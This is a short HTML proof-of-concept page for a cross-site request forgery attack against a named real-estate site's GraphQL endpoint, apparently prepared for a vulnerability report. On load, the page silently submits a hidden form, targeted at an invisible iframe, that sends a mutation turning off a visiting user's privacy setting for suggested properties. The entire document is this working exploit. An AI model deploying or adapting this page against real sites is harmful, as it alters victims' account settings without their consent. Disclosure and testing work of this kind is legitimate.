<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Pure CSRF PoC (Form)</title>
</head>
<body onload="document.getElementById('csrfForm').submit();">
  <h3>Pure CSRF PoC â€” auto-submit form</h3>

  <iframe name="hidden_iframe" style="display:none;"></iframe>

  <form id="csrfForm"
        action="https://mexa.realestate.com.au/graphql"
        method="POST"
        target="hidden_iframe"
        enctype="application/x-www-form-urlencoded">

    <input type="hidden" name="operationName" value="DisablePrivacySettingQuery">

    <input type="hidden" name="query"
      value='mutation DisablePrivacySettingQuery($groupId: PrivacyGroupId!) {
        disablePrivacySetting(groupId: $groupId) {
          groupId
          enabled
          __typename
        }
      }'>

    <input type="hidden" name="variables"
      value='{"groupId":"SUGGESTED_PROPERTIES"}'>

    <noscript><input type="submit" value="Submit manually"></noscript>
  </form>
</body>
</html>
